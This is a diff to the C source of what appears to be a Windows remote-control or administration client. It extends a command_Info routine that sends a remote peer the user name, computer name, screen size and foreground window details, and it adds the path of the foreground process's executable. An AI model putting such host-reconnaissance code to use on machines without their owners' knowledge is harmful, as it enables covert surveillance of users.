@@ -1,17 +1,19 @@
 #include <stdlib.h>
 #include <windows.h>
+#include <psapi.h>
 #include "types.h"
 #include "cmd/commands.h"
 #include "net/interface.h"
 #include "net/error.h"
 
-#define COMMAND_INFO_BUFF 126
+#define COMMAND_INFO_BUFF 500
 #define COMMAND_INFO_USERNAME 0x10
 #define COMMAND_INFO_COMPUTERNAME 0x11
 #define COMMAND_INFO_SC_WIDTH 0x12
 #define COMMAND_INFO_SC_HEIGHT 0x13
 #define COMMAND_INFO_FW_PID 0x14
 #define COMMAND_INFO_FW_TITLE 0x15
+#define COMMAND_INFO_FW_EXECUTABLE 0x16
 
 int command_Info(void)
 {
@@ -211,6 +213,54 @@ int command_Info(void)
 		}
 
 		free(rmsg);
+		buffLen = COMMAND_INFO_BUFF - 1;
+		memset(buff, 0, COMMAND_INFO_BUFF + 1);
+
+		HANDLE hand = OpenProcess(PROCESS_QUERY_INFORMATION, 1, focusPid);
+		
+		if(!hand)
+		{
+			spm[0] = COMMAND_INFO_FW_EXECUTABLE;
+			
+			if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
+			{
+				free(screen_val);
+	
+				return NET_LOST_CONNECTION;
+			}
+		}else{
+			buff[0] = COMMAND_INFO_FW_EXECUTABLE;
+		
+			if(GetModuleFileNameEx(hand, NULL, buff + 1, COMMAND_INFO_BUFF - 1))
+			{
+				if(net_SendCmd((uint8*)buff, strlen(buff + 1) + 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
+				{
+					free(screen_val);
+	
+					return NET_LOST_CONNECTION;
+				}
+			}else{
+				spm[0] = COMMAND_INFO_FW_EXECUTABLE;
+
+				if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
+				{
+					free(screen_val);
+		
+					return NET_LOST_CONNECTION;
+				}
+			}
+
+			CloseHandle(hand);
+		}
+
+		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
+		{
+			free(rmsg);
+			
+			return NET_LOST_CONNECTION;
+		}
+
+		free(rmsg);
 	}else{
 		spm[0] = COMMAND_INFO_FW_PID;
 		
@@ -222,6 +272,15 @@ int command_Info(void)
 		}
 
 		spm[0] = COMMAND_INFO_FW_TITLE;
+		
+		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
+		{
+			free(screen_val);
+
+			return NET_LOST_CONNECTION;
+		}
+
+		spm[0] = COMMAND_INFO_FW_EXECUTABLE;
 		
 		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
 		{
